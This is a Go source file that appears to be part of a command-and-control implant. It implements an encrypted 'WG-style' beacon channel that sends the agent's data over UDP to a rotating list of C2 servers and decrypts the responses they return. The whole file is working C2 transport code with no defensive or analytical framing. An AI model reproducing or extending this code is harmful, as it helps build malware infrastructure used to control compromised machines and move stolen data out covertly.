//go:build linux || windows || darwin
// +build linux windows darwin

package main

import (
	"crypto/rand"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net"
	"strings"
	"time"

	"golang.org/x/crypto/chacha20poly1305"
	"golang.org/x/crypto/curve25519"
)

var (
	wgPrivateKey [32]byte
	wgPublicKey  [32]byte
	wgSharedKey  [32]byte
	wgKeyLoaded  bool
)

func initWG() {
	privB64 := WGPrivateKeyStr
	if privB64 == "" {
		return
	}
	priv, err := base64.StdEncoding.DecodeString(privB64)
	if err != nil || len(priv) != 32 {
		if Debug {
			fmt.Printf("[!] WG: invalid private key: %v\n", err)
		}
		return
	}
	copy(wgPrivateKey[:], priv)

	// Derive public key
	pub, err := curve25519.X25519(wgPrivateKey[:], curve25519.Basepoint)
	if err != nil {
		if Debug {
			fmt.Printf("[!] WG: public key derivation failed: %v\n", err)
		}
		return
	}
	copy(wgPublicKey[:], pub)

	// Compute shared secret with server's public key
	peerPubB64 := WGServerPublicStr
	if peerPubB64 != "" {
		peerPub, err := base64.StdEncoding.DecodeString(peerPubB64)
		if err == nil && len(peerPub) == 32 {
			shared, err := curve25519.X25519(wgPrivateKey[:], peerPub)
			if err == nil {
				copy(wgSharedKey[:], shared)
				wgKeyLoaded = true
			}
		}
	}
}

func sendWGBeacon(body []byte) []byte {
	if !wgKeyLoaded {
		if Debug {
			fmt.Println("[!] WG: keys not loaded, skipping")
		}
		return nil
	}
	startIdx := currentC2Idx
	for i := 0; i < len(C2URLs); i++ {
		idx := (startIdx + i) % len(C2URLs)
		c2URL := C2URLs[idx]

		if !strings.HasPrefix(c2URL, "wg://") {
			continue
		}

		addr := strings.TrimPrefix(c2URL, "wg://")
		if !strings.Contains(addr, ":") {
			addr = addr + ":51820"
		}

		udpAddr, err := net.ResolveUDPAddr("udp", addr)
		if err != nil {
			if Debug {
				fmt.Printf("[!] WG: resolve %s failed: %v\n", addr, err)
			}
			continue
		}

		conn, err := net.DialUDP("udp", nil, udpAddr)
		if err != nil {
			if Debug {
				fmt.Printf("[!] WG: dial %s failed: %v\n", addr, err)
			}
			continue
		}

		// Encrypt body with ChaCha20-Poly1305 using shared key
		aead, err := chacha20poly1305.NewX(wgSharedKey[:])
		if err != nil {
			conn.Close()
			continue
		}
		nonce := make([]byte, 24)
		if _, err := rand.Read(nonce); err != nil {
			conn.Close()
			continue
		}
		cipher := aead.Seal(nil, nonce, body, nil)
		msg := WGAgentMessage{
			Nonce:  nonce,
			Cipher: cipher,
			PubKey: wgPublicKey[:],
		}
		msgData, _ := json.Marshal(msg)

		conn.SetDeadline(time.Now().Add(30 * time.Second))
		if _, err := conn.Write(msgData); err != nil {
			conn.Close()
			if Debug {
				fmt.Printf("[!] WG: write to %s failed: %v\n", addr, err)
			}
			continue
		}

		// Read response
		respBuf := make([]byte, 65535)
		n, err := conn.Read(respBuf)
		conn.Close()
		if err != nil {
			if Debug {
				fmt.Printf("[!] WG: read from %s failed: %v\n", addr, err)
			}
			continue
		}

		var respMsg WGAgentMessage
		if err := json.Unmarshal(respBuf[:n], &respMsg); err != nil {
			continue
		}
		if len(respMsg.Nonce) == 0 || len(respMsg.Cipher) == 0 {
			continue
		}

		plaintext, err := aead.Open(nil, respMsg.Nonce, respMsg.Cipher, nil)
		if err != nil {
			if Debug {
				fmt.Printf("[!] WG: decrypt response from %s failed: %v\n", addr, err)
			}
			continue
		}

		currentC2Idx = idx
		if Debug {
			fmt.Printf("[+] WG Beacon OK from %s, response %d bytes\n", addr, len(plaintext))
		}
		return plaintext
	}
	return nil
}

// WGAgentMessage is the on-wire frame format for agent<->server WG-style transport.
type WGAgentMessage struct {
	Nonce  []byte `json:"n"`
	Cipher []byte `json:"c"`
	PubKey []byte `json:"k,omitempty"`
}
